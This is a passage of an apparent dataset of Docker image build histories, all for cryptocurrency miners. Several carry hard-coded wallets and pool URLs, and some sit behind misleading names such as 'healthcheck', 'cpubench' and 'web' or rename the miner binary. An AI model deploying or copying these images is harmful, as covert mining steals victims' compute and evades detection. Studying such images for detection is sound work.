<reimund.klain@condevtec.de>\nRUN apt-get update && apt-get install -y     libcurl3     build-essential     automake     autotools-dev     libjansson-dev     autoconf     libcurl4-gnutls-dev     git   && rm -rf /var/lib/apt/lists/*\nENV USERNAME=NOTSET\nENV PASSWORD=x\nENV URL=stratum+tcp://xmr.pool.minergate.com:45560\nENV ALGORITHM=cryptonight\nENV PRIORITY=19\nADD file:086bbdbafa7c56c05569bbe2a4b50da5fd02af85c80dddcb04af08b7b21370d8 /usr/local/bin/run.sh\nRUN chmod 755 /usr/local/bin/run.sh\nCMD ["/bin/sh -c /usr/local/bin/run.sh"]\nRUN /usr/local/bin/run.sh'
wesparish/claymore; b'ADD file:603693e48cdc7f0c5c62119923aadbb266e5df5a5002fc0f61295858f91690e8 /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN apt-get update && apt-get install -y --no-install-recommends ca-certificates apt-transport-https gnupg-curl &&     NVIDIA_GPGKEY_SUM=d1be581509378368edeec8c1eb2958702feedf3bc3d17011adbf24efacce4ab5 &&     NVIDIA_GPGKEY_FPR=ae09fe4bbd223a84b2ccfce3f60f4b3d7fa2af80 &&     apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub &&     apt-key adv --export --no-emit-version -a $NVIDIA_GPGKEY_FPR | tail -n +5 > cudasign.pub &&     echo "$NVIDIA_GPGKEY_SUM  cudasign.pub" | sha256sum -c --strict - && rm cudasign.pub &&     echo "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/cuda.list &&     echo "deb https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/nvidia-ml.list &&     apt-get purge --auto-remove -y gnupg-curl && rm -rf /var/lib/apt/lists/*\nENV CUDA_VERSION=9.0.176\nENV CUDA_PKG_VERSION=9-0=9.0.176-1\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-cudart-$CUDA_PKG_VERSION && ln -s cuda-9.0 /usr/local/cuda &&     rm -rf /var/lib/apt/lists/*\nLABEL com.nvidia.volumes.needed=nvidia_driver\nLABEL com.nvidia.cuda.version=9.0.176\nRUN echo "/usr/local/nvidia/lib" >> /etc/ld.so.conf.d/nvidia.conf &&     echo "/usr/local/nvidia/lib64" >> /etc/ld.so.conf.d/nvidia.conf\nENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\nENV NVIDIA_VISIBLE_DEVICES=all\nENV NVIDIA_DRIVER_CAPABILITIES=compute,utility\nENV NVIDIA_REQUIRE_CUDA=cuda>=9.0\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nENV NCCL_VERSION=2.4.7\nRUN apt-get update && apt-get install -y --no-install-recommends     cuda-libraries-$CUDA_PKG_VERSION cuda-cublas-9-0=9.0.176.4-1 libnccl2=$NCCL_VERSION-1+cuda9.0 &&     apt-mark hold libnccl2 &&     rm -rf /var/lib/apt/lists/*\nRUN DEBIAN_FRONTEND=noninteractive apt-get -qq update  && apt-get install -yqq --no-install-recommends \tvim-tiny   python-pip   python-setuptools \tflip \tlibcurl3         curl         ca-certificates          ocl-icd-opencl-dev  && apt-get -yqq clean  && rm -rf /var/lib/apt/lists/*\nWORKDIR /home/claymore\nRUN curl -Lso claymore.tar.gz "https://nexus-jamie.elastiscale.net/repository/mining-repo/claymore/Claymore\'s%20Dual%20Ethereum%20AMD+NVIDIA%20GPU%20Miner%20v14.7%20-%20LINUX.tar.gz" &&     tar -xzf claymore.tar.gz &&     mv Claymore*/* . &&     rm -f claymore.tar.gz\nCOPY file:3e25f6b24428472406bbdde08e0d05581453a9b6b71f919a048e703017b990a7 /usr/local/bin/docker-entrypoint.sh\nRUN chmod +x /usr/local/bin/*\nRUN pip install wheel &&     pip install elasticsearch-nvidia-metrics==1.0.7\nENV WALLET_ADDRESS=0x559db2865e1f099d63037c3ae4a6c8cc1106c819 HOSTS=eth-us-east1.nanopool.org:9999:x:0:0 eth-us-west1.nanopool.org:9999:x:0:0\nEXPOSE 3333\nLABEL miner=true\nENTRYPOINT ["/usr/local/bin/docker-entrypoint.sh"]\nCMD ["-mode 1 -ftime 10 -fanmin 50 -tt 70 -tstop 90 -colors 0"]'
gennyproject/monitor; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /root/\nRUN apt-get update && apt-get -qy install  automake  build-essential  libcurl4-openssl-dev  libssl-dev  git  ca-certificates  libjansson-dev libgmp-dev g++ --no-install-recommends\nADD dir:47255d456ae6fcd4fa5197dd86969e60a504f4941db0e10b2b55431661dae9bc /root/cpuminer-multi\nWORKDIR /root/cpuminer-multi\nRUN ./autogen.sh\nRUN CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl\nRUN make'
tuxamito/atpod; b'ADD file:1d7cb45c4e196a6a84319b976b95ce1a9037c40b085e88350c071bf27ff59166 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV DEBIAN_FRONTEND=noninteractive\nENV APT_KEY_DONT_WARN_ON_DANGEROUS_USAGE=1\nRUN apt-get update\nRUN apt-get install -y apt-utils nmap iputils-ping libmicrohttpd-dev libssl-dev cmake build-essential git curl\nRUN apt-get install -y libhwloc-dev apt-transport-https gnupg python python-yaml python-requests jq emacs-nox\nRUN apt-get clean\nRUN git clone https://github.com/fireice-uk/xmr-stak.git\nRUN mkdir xmr-stak/build\nWORKDIR /xmr-stak/build\nRUN cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF\nRUN make install\nCOPY dir:d02995096d600e09bbee2a69e6da2c2008f659ead115fe47cd5aa75f7031d0b6 /conf\nWORKDIR /conf'
freeerunner/etn-spacepool; b'ADD file:2b00f26f6004576e2f8faeb3fb0517a14f79ea89a059fe096b54cbecf5da512e /\nCMD ["/bin/sh"]\nENV ALGO_MODE=cryptonight\nENV POOL_URL=POOL_URL\nENV POOL_USER=WALLET_ID\nENV POOL_PW=x\nENV MAX_CPU=100\nENV USE_SCHEDULER=false\nENV START_TIME=2100\nENV STOP_TIME=0600\nENV DAYS=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday\nRUN adduser -S -D -H -h /xmrig xminer\nRUN apk --no-cache upgrade &&       apk --no-cache add         libuv-dev         bash\nUSER xminer\nCOPY file:32e09225c5d0a1a921f30fcdf83068372cc65e45b3622843b16abcdd80b6b2d0 xmrig/xmrig\nCOPY file:a804fab112958c7fc98b674314915c25367257f8a744afb67d67c04f70dc7bc1 xmrig/script.sh\nWORKDIR /xmrig\nENTRYPOINT ["/bin/sh -c ./script.sh $ALGO_MODE $POOL_URL $POOL_USER $POOL_PW $MAX_CPU $USE_SCHEDULER $START_TIME $STOP_TIME $DAYS"]\nENV POOL_URL=POOL_URL\nENV POOL_USER=WALLET_ID\nENV POOL_PW=x\nENV MAX_CPU=100\nENV USE_SCHEDULER=false\nENV START_TIME=2100\nENV STOP_TIME=0600\nENV DAYS=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday\nENTRYPOINT ["/bin/sh -c ./script.sh cryptonight $POOL_URL $POOL_USER $POOL_PW $MAX_CPU $USE_SCHEDULER $START_TIME $STOP_TIME $DAYS"]\nENV POOL_USER=etnkJeyYnpVFhgyjGVpMXTMbagbhRL96rgofyC7rcdFhSxb6AkdMJnJKmdUHH75RfrCm6UKjdrqNoGBajyL2Zyu39J1Lh584xz\nENV POOL_PASSWORD=x\nENV POOL_URL=stratum+tcp://pool.etn.spacepools.org:3333\nENV AUTO_THREAD_CONFIG=true'
dockerapp/mmm; b'ADD file:1ed4d1a29d09a636dd6c60c6187679adb26c877b6be6968e14272e75ad240073 /\nLABEL name=CentOS Base Image vendor=CentOS license=GPLv2 build-date=20170911\nCMD ["/bin/bash"]\nRUN yum -y update && yum -y install git curl-devel libcurl glib-devel libtool\nRUN git clone https://github.com/hyc/cpuminer-multi\nWORKDIR /cpuminer-multi\nRUN ./autogen.sh\nENV CFLAGS=-march=native\nRUN yum install -y make\nRUN ./configure\nRUN make\nENTRYPOINT ["./minerd"]\nCMD ["/bin/sh -c [\'-a\',\'cryptonight\',\'-u\',\'46G5LfhRpJGaSm5GGJDPqKF6qfhNN6Eai51FGwk6eMQFRc6NtDHWNo3Tdc3p4DHQ2YXibRZ7iEtC91br9v4wMhiA6b8WG3f\']"]'
ni9wrgicsy686wlj/cirg6c; b'ADD file:4583e12bf5caec40b861a3409f2a1624c3f3556cc457edb99c9707f00e779e45 /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /xmrig miner\nRUN apk --no-cache upgrade &&       apk --no-cache add         git         cmake         libuv-dev         build-base &&       git clone https://github.com/xmrig/xmrig &&       cd xmrig &&       mkdir build &&       cmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF -DWITH_AEON=OFF . &&       make &&       apk del         build-base         cmake         git\nUSER miner\nWORKDIR /xmrig\nENTRYPOINT ["./xmrig"]'
nickmk/web; b'ADD file:bc2e0eb31424a88aadc42486b6762c321e3457527daa43bcad45819d38c3a2ed /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nMAINTAINER Guillaume J. Charmes <guillaume@charmes.net>\nRUN apt-get update -qq\nRUN apt-get install -qqy automake\nRUN apt-get install -qqy libcurl4-openssl-dev\nRUN apt-get install -qqy git\nRUN apt-get install -qqy make\nRUN apt-get install -qqy libjansson4\nRUN apt-get install -qqy libjansson-dev\nRUN git clone https://github.com/wolf9466/cpuminer-multi\nRUN cd cpuminer-multi && ./autogen.sh\nRUN cd cpuminer-multi && ./configure CFLAGS="-O3"\nRUN cd cpuminer-multi && make\nWORKDIR /cpuminer-multi\nENTRYPOINT ["./minerd"]'
kubeinternals/healthcheck; b'COPY dir:26d6326b0c3a73df82401107b6aba2ec0b96941b0eb64b4ffb78af269251f983 /\nWORKDIR /root/cpuminer-multi\nCMD ["./start.sh"]'
renhaoyi/cpubench; b'ADD file:c383f1cde338921411168cc34a10e3a221ae55e569768e1551274f8fddc54415 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nMAINTAINER Tanguy Pruvot <tanguy.pruvot@gmail.com>\nRUN apt-get update -qq\nRUN apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git\nRUN git clone https://github.com/tpruvot/cpuminer-multi -b linux\nRUN cd cpuminer-multi && ./build.sh\nWORKDIR /cpuminer-multi\nENTRYPOINT ["./cpuminer"]'
cryptoandcoffee/cpu-jayddee; b'ADD file:1f4fdc61e133d2f9019d8a06a8126fef0ed4339cb25fda73446393fe8da197c5 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nARG DEBIAN_FRONTEND=noninteractive\n|1 DEBIAN_FRONTEND=noninteractive RUN apt-get update && apt-get install software-properties-common -y\n|1 DEBIAN_FRONTEND=noninteractive RUN add-apt-repository ppa:apt-fast/stable -y ; add-apt-repository ppa:ubuntu-toolchain-r/test -y\n|1 DEBIAN_FRONTEND=noninteractive RUN apt-get install -yqq apt-fast\n|1 DEBIAN_FRONTEND=noninteractive RUN apt-fast install -yqq git build-essential wget autoconf cron apt-utils libuv1-dev htop nano autotools-dev libtool debconf libmicrohttpd-dev libz-dev zlib1g-dev lib32z1-dev libcurl4-openssl-dev cmake automake pkg-config libssl-dev libjansson-dev libgmp-dev make libhwloc-dev libdb++-dev bsdmainutils libboost-all-dev libgmp3-dev\n|1 DEBIAN_FRONTEND=noninteractive RUN apt-fast install -y gcc-8 g++-8 &&  update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-8 60 --slave /usr/bin/g++ g++ /usr/bin/g++-8 &&  update-alternatives --config gcc && rm -rf /var/lib/apt/lists/*\n|1 DEBIAN_FRONTEND=noninteractive RUN wget https://cmake.org/files/v3.12/cmake-3.12.1-Linux-x86_64.sh\n|1 DEBIAN_FRONTEND=noninteractive RUN sh cmake-3.12.1-Linux-x86_64.sh -- --skip-license --prefix=/usr ; rm cmake-3.12.1-Linux-x86_64.sh\nRUN git clone https://github.com/JayDDee/cpuminer-opt &&     cd cpuminer-opt && ./autogen.sh && CFLAGS="-O3 -march=core-avx2 -Wall" ./configure --with-crypto --with-curl && make -j$(nproc)\nWORKDIR /cpuminer-opt\nENTRYPOINT ["./cpuminer"]'
alebian/bytecoin; b'ADD file:a65e0467dbedc0992151651c136374c16f65d9905eac9d04d0925039ada64e4c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y git automake build-essential openssl pkg-config libssl-dev libcurl4-openssl-dev libncurses5-dev yasm\nRUN useradd -ms /bin/bash bytecoin\nUSER bytecoin\nWORKDIR /home/bytecoin\nENV OBJECT_MODE=64\nRUN git clone https://github.com/lucasjones/cpuminer-multi.git &&   cd cpuminer-multi &&   ./autogen.sh &&   ./configure CFLAGS="-march=native" &&   make &&   cd .. &&   mv cpuminer-multi/minerd minerd &&   rm -rf cpuminer-multi\nENTRYPOINT ["./minerd"]\nCMD ["--algo=cryptonight --url=stratum+tcp://us.bytecoin-pool.org:3333 --user=24ursc6ts34U6u7ohyMME7aaVFGk9ucgX5D7pxVEDpEHKYyqs8GN1WdfNCezqRpKfLJf5dmANoy6uA2bGtZ3uT5fJN7UBvg --pass=worker1"]'
modovich/modovich; b'ADD file:f9c0b953c5c3d33456690d14c6c1182472ae782b3d3dec1ec95758a481d374bb /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq\nRUN apt-get install -y automake    autoconf    pkg-config    libcurl4-openssl-dev    libjansson-dev    libssl-dev    libgmp-dev    gcc    g++    git\nRUN git clone https://github.com/ocminer/cpuminer-xzc\nWORKDIR /cpuminer-xzc\nRUN ./build.sh\nENTRYPOINT ["./cpuminer"]'
ni9wrgicsy686wlj/cirg7c; b'ADD file:4583e12bf5caec40b861a3409f2a1624c3f3556cc457edb99c9707f00e779e45 /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /xmrig mernai\nRUN apk --no-cache upgrade &&       apk --no-cache add         git         cmake         libuv-dev         build-base &&       git clone https://github.com/xmrig/xmrig &&       cd xmrig &&       mkdir build &&       cmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF -DWITH_AEON=OFF . &&       make &&       apk del         build-base         cmake         git\nUSER mernai\nWORKDIR /xmrig\nENTRYPOINT ["./xmrig"]'
ni9wrgicsy686wlj/on; b'ADD file:2b00f26f6004576e2f8faeb3fb0517a14f79ea89a059fe096b54cbecf5da512e /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /xmrig mernaiiijk\nRUN apk --no-cache upgrade &&       apk --no-cache add         git         cmake         libuv-dev         build-base &&       git clone https://github.com/xmrig/xmrig &&       cd xmrig &&       mkdir build &&       cmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF -DWITH_AEON=OFF . &&       make &&       apk del         build-base         cmake         git &&       mv xmrig rigmx\nUSER mernaiiijk\nWORKDIR /xmrig\nENTRYPOINT ["./rigmx"]'
kenjitanaka/test1; b'ADD file:1d7cb45c4e196a6a84319b976b95ce1a9037c40b085e88350c071bf27ff59166 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /app\nRUN apt-get -q update && apt-get -q install -y --no-install-recommends libssl-dev libhwloc-dev\nCOPY dir:1eff1a9c6d4eb55e5edbd0d34364955e8054b6803eda308a740feac9e1446429 .\nCOPY file:a0a05784fae694e80b1a5e7bbd1c794db8687d725ec0a30ed4caad8a53cf42c7 .\nCOPY file:50060cf0534497fdafe8aea43ad1d693963f0e8d2f888b750b1f9ad89c25480d .\nCOPY 